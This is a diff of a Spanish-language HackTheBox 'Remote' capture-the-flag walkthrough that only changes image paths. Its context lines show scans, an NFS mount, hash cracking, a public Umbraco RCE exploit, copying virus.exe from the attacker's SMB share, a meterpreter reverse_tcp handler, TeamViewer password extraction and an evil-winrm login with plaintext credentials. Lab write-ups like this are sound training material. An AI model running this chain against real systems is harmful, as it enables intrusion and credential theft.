@@ -15,11 +15,11 @@ nmap -p- --open -sCV -sS -n -Pn -vvv 10.10.10.180 -oN escaneo_nmap
 
 Y nos encontrará un montón de puertos abiertos, vemos 2 que nos interesan a primera vista.
 
-![image](assets/zimages/Pasted_image_20231203203247.png)
+![image](../zimages/Pasted_image_20231203203247.png)
 
 Si probamos a entrar en ftp como Anonymous no nos encuentra nada dentro de ftp:
 
-![image](assets/zimages/Pasted_image_20231203203401.png)
+![image](../zimages/Pasted_image_20231203203401.png)
 
 Vamos a entrar en el puerto 80 (la web), inspeccionamos un poco pero no vemos nada interesante, vamos a hacer un wfuzz para encontrar subdirectorios:
 
@@ -31,11 +31,11 @@ wfuzz -c --hc=404 -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-me
 
 Con estos parámetros nos encuentra un montón de subdirectorios, pero si inspeccionamos un poco vemos que nos aparece uno que se llama "install", que si nos metemos desde la web nos hace un redirect a esta página:
 
-![image](assets/zimages/Pasted_image_20231203203911.png)
+![image](../zimages/Pasted_image_20231203203911.png)
 
 Una vez en esta página vemos que hay un panel de login, pero no parece que haya forma de entrar de momento. Si **volvemos sobre nuestros pasos** y nos vamos al escaneo de nmap que hicimos antes nos damos cuenta que el siguiente puerto de nfs está abierto:
 
-![image](assets/zimages/Pasted_image_20231203204430.png)
+![image](../zimages/Pasted_image_20231203204430.png)
 
 En este puerto se están emitiendo una ubicación por la red (una montura), con el comando
 
@@ -47,7 +47,7 @@ showmount -e "10.10.10.180"
 
 podemos ver las monturas que está emitiendo esa ip:
 
-![image](assets/zimages/Pasted_image_20231203204727.png)
+![image](../zimages/Pasted_image_20231203204727.png)
 
 Aunque también podemos hacerlo con nmap mediante el comando
 
@@ -57,7 +57,7 @@ nmap -p 111 --script=nfs-showmount "10.10.10.180"
 
 ```
 
-![image](assets/zimages/Pasted_image_20231203204842.png)
+![image](../zimages/Pasted_image_20231203204842.png)
 
 Una vez en este punto, podemos montar en local esa montura con el comando
 
@@ -67,7 +67,7 @@ mount -t nfs 10.10.10.180:/site_backups /mnt/
 
 ```
 
-![image](assets/zimages/Pasted_image_20231203205218.png)
+![image](../zimages/Pasted_image_20231203205218.png)
 
 Si vamos al directorio App_Data vemos que hay un archivo .sdf llamado *Umbraco.sdf*, donde vienen datos en binario. Hay mucha información, así que vamos a poner el comando
 
@@ -79,19 +79,19 @@ cat Umbraco.sdf | head
 
 para que nos ponga en pantalla solo las primeras líneas de este archivo, en las que vemos un hash de la contraseña de admin:
 
-![image](assets/zimages/Pasted_image_20231203205630.png)
+![image](../zimages/Pasted_image_20231203205630.png)
 
 Si nos vamos a la web de https://crackstation.net la crackeamos fácil:
 
-![image](assets/zimages/Pasted_image_20231203205736.png)
+![image](../zimages/Pasted_image_20231203205736.png)
 
 También tenemos el usuario de la web del admin, el login donde pedía un correo:
 
-![image](assets/zimages/Pasted_image_20231203205810.png)
+![image](../zimages/Pasted_image_20231203205810.png)
 
 Si nos vamos a la web y probamos con estas credenciales entramos a la web, que si nos vamos a la esquina de arriba a la izquierda, donde nuestro usuario admin, tendríamos la versión de *Umbraco*:
 
-![image](assets/zimages/Pasted_image_20231203210018.png)
+![image](../zimages/Pasted_image_20231203210018.png)
 
 Si buscamos un exploit por GitHub, nos encontramos con la web https://github.com/Jonoans/Umbraco-RCE/, donde hay que clonar el repositorio. Una vez clonado e instalados los requirements, ejecutamos el ejecutable .py (exploit.py) de la siguiente manera
 
@@ -103,7 +103,7 @@ python3 exploit.py -u admin@htb.local -p baconandcheese -w http://10.10.10.180 -
 
 Una vez puesto este comando, nos da una shell directamente:
 
-![image](assets/zimages/Pasted_image_20231203213041.png)
+![image](../zimages/Pasted_image_20231203213041.png)
 
 El problema es que si probamos a poner comandos básicos no funciona bien.
 
@@ -151,7 +151,7 @@ copy \\10.10.14.20\samucrow\virus.exe virus.exe
 
 Una vez tenemos el virus dentro del sistema víctima, nos vamos a metasploit usando msfconsole para usar multi/handler:
 
-![image](assets/zimages/Pasted_image_20231203215628.png)
+![image](../zimages/Pasted_image_20231203215628.png)
 
 con el comando
 
@@ -163,19 +163,19 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 
 vamos a definir el mismo payload que pusimos en el .exe que copiamos en la máquina víctima para conseguir una meterpreter. Vamos a poner los datos que nos piden de nuestra ip, tanto en el payload como en el multi/handler, y vamos a poner también el puerto 5555 en ambos, que es el que especificamos anteriormente en el payload también:
 
-![image](assets/zimages/Pasted_image_20231203220118.png)
+![image](../zimages/Pasted_image_20231203220118.png)
 
 ponemos el comando run y ejecutamos el virus.exe en la máquina víctima poniendo `./virus.exe`, lo que nos dará una meterpreter:
 
-![image](assets/zimages/Pasted_image_20231203220355.png)
+![image](../zimages/Pasted_image_20231203220355.png)
 
 Una vez en la meterpreter, ponemos `shell` y nos dará una shell de windows:
 
-![image](assets/zimages/Pasted_image_20231203221312.png)
+![image](../zimages/Pasted_image_20231203221312.png)
 
 ahora iremos a C:\Users\Public\ para ver la flag de user:
 
-![image](assets/zimages/Pasted_image_20231203221719.png)
+![image](../zimages/Pasted_image_20231203221719.png)
 
 
 
@@ -194,19 +194,19 @@ search teamviewer
 ```
 
 
-![image](assets/zimages/Pasted_image_20231203223006.png)
+![image](../zimages/Pasted_image_20231203223006.png)
 
 elegimos al opción "1" y si ponemos `show options` vemos que nos pide un SESSION, por lo que listamos las sesiones activas con `session -l`:
 
   
 
-![image](assets/zimages/Pasted_image_20231203223209.png)
+![image](../zimages/Pasted_image_20231203223209.png)
 
 elegimos la opción "1" y ponemos `run` y nos encontrará la contraseña de TeamViewer:
 
   
 
-![image](assets/zimages/Pasted_image_20231203223318.png)
+![image](../zimages/Pasted_image_20231203223318.png)
 
 Para deducir de que usuario es esta contraseña, vamos otra vez a la shell de meterpreter con `session -i 1` y vamos a la ruta "*C:\users*", donde veremos  que solo existe el usuario **Administrador**.
 
@@ -220,7 +220,7 @@ evil-winrm -i 10.10.10.180 -u 'Administrator' -p '!R3m0te!'
 
 Ahora nos iríamos al escritorio del Administrador y tendremos la flag de root:
 
-![image](assets/zimages/Pasted_image_20231203224126.png)
+![image](../zimages/Pasted_image_20231203224126.png)
 
 
 # Escalada 2 (NO FUNCIONAL)
@@ -228,6 +228,6 @@ Ahora nos iríamos al escritorio del Administrador y tendremos la flag de root:
 
 Si nos vamos a la consola de metasploit, podemos poner el comando `search local_exploit_suggester` y `use 0` para usar el exploit suggester, una vez hecho esto, ponemos `set SESSION 1` y `run`, así nos buscará posibles formas de conseguir privilegios de Administrador.
   
-![image](assets/zimages/Pasted_image_20231203224957.png)
+![image](../zimages/Pasted_image_20231203224957.png)
 
 Probamos con todos los posibles exploits pero ninguno funciona
